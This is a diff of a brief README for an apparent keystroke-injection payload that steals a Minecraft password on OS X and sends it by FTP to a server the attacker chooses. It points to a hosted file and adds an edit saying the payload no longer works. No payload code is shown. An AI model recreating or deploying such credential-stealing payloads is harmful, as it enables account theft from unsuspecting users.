@@ -1,4 +1,5 @@
 This is a payload for all of the gamers that dumps the minecraft password and sends it via ftp to the server of your choice.  Works only on OS X because there aren't a whole lot of practical uses for this other than to prove how insecure some games are. Requires a web server, and an ftp server. You need to host [this file](https://app.box.com/s/3svc1gvulsqrtusj4eqg) on the root of the webserver (do not change the name or else it won't run)
+**Edit:** No longer works due to authentication method change.  Still an interesting concept though
 
 
     REM Author: Jesse Wallace
